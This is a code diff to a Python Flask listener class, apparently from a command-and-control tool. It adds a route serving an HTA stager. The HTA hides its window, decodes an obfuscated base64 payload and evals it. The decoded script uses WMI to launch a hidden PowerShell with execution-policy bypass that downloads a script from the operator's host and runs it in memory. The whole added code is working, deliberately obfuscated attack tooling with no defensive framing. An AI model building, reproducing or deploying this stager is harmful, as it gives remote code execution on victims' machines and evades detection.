@@ -97,6 +97,99 @@ class NewListener:
   def create_path(self):
       app.add_url_rule("/%s" % self.path, self.host, self.powershell_code)
 
+  def create_hta(self):
+      app.add_url_rule(mshta_url, "hta" , self.hta)
+
+  def hta(self):
+      code = '''
+<html>
+<head>
+<script language="JScript">
+window.resizeTo(1, 1);
+window.moveTo(-2000, -2000);
+window.blur();
+
+try
+{
+    window.onfocus = function() { window.blur(); }
+    window.onerror = function(sMsg, sUrl, sLine) { return false; }
+}
+catch (e){}
+
+function replaceAll(find, replace, str) 
+{
+  while( str.indexOf(find) > -1)
+  {
+    str = str.replace(find, replace);
+  }
+  return str;
+}
+function bas( string )
+    {
+        string = replaceAll(']','=',string);
+        string = replaceAll('[','a',string);
+        string = replaceAll(',','b',string);
+        string = replaceAll('@','D',string);
+        string = replaceAll('-','x',string);
+        string = replaceAll('~','N',string);
+        string = replaceAll('*','E',string);
+        string = replaceAll('%','C',string);
+        string = replaceAll('$','H',string);
+        string = replaceAll('!','G',string);
+        string = replaceAll('{','K',string);
+        string = replaceAll('}','O',string);
+        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+        var result     = '';
+
+        var i = 0;
+        do {
+            var b1 = characters.indexOf( string.charAt(i++) );
+            var b2 = characters.indexOf( string.charAt(i++) );
+            var b3 = characters.indexOf( string.charAt(i++) );
+            var b4 = characters.indexOf( string.charAt(i++) );
+
+            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );
+            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );
+            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );
+
+            result += String.fromCharCode(a) + (b?String.fromCharCode(b):'') + (c?String.fromCharCode(c):'');
+
+        } while( i < string.length );
+
+        return result;
+    }
+
+var es = '{code}';
+eval(bas(es));
+</script>
+<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />
+</head>
+<body>
+</body>
+</html> 	
+
+'''
+      js = '''
+var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('http://{ip}:{port}/{payload}'));";
+var w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');
+w32ps.SpawnInstance_();
+w32ps.ShowWindow=0;
+var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\\\',w32ps,null);
+'''
+      js = js.replace('{ip}',self.host).replace('{port}',str(self.bindport)).replace('{payload}',self.path)
+      #print  js
+      js = js.encode('base64').replace('\n','')
+      re = [[']','='],['[','a'],[',','b'],['@','D'],['-','x'],['~','N'],['*','E'],['%','C'],['$','H'],['!','G'],['{','K'],['}','O']]
+      #print  js
+      for i in re:
+            js = js.replace(i[1],i[0])
+      #print js
+      code=code.replace('{code}',js)
+      resp = make_response(code)
+      resp.headers["Server"] = server_response_header
+      return resp
+
+
 
 @app.route("/")
 def index():
